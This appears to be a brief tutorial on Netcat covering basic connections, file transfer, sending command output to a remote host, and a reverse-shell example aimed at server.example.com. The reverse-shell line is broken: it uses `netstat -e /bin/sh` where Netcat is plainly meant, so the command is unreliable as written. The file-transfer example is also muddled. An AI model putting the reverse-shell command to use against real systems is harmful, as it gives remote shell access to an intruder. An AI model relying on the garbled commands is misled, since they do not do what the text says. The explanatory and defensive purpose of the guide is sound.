When working either in forensics, penetration testing, or hacking around in general, Netcat is a vital tool to know.
It's acts as a very thin layer of TCP, converting a network socket into terminal I/O.
A system is set up to listen on a port, and another system connects to that port.
The standard input of one end ends up on the standard output of the other end, and vice versa.
See the [man page](https://www.commandlinux.com/man-page/man1/nc.1.html).

If available, [Ncat](https://nmap.org/ncat/) is generally a more featured version of `nc`.

## Usage
```
nc [-options] hostname port[s] [ports] ...
nc -l -p port [-options] [hostname] [port]
```

## Examples
### Basic connection
Connect over port 1337:

Server:
```
$ nc -l -p 1337
```

Client:
```
$ nc server.example.com 1337
```

### Transfer a file
All you have to do for file transfer is redirect stdin/stdout the same way you would for
[Linux]({% post_url linux/2018-04-20-bash %}) or [Windows]({% post_url windows/2018-04-20-cmd %}).

Server:
```
$ nc -l -p 1337 > out-file.txt
```

Client:
```
$ < out-file.txt nc server.example.com 1337
```

### Transferring the output of a command
Use pipes as you normally would.

Server:
```
$ nc -l -p 1337 > netstat-results.txt
```

Client:
```
$ netstat -tualpn | nc server.example.com 1337
```

Pro tip: if you are having trouble reading the output of Linux commands on Windows, it's probably due to line endings.
Don't use Notepad - use Notepad++, Sublime, VSCode, or any other decent editor.

### Opening a reverse shell
While not often done in forensics, understanding how to use a reverse shell is valuable.

Server:
```
$ nc -l -p 1337
```

Client:
```
$ netstat -e /bin/sh server.example.com 1337
```
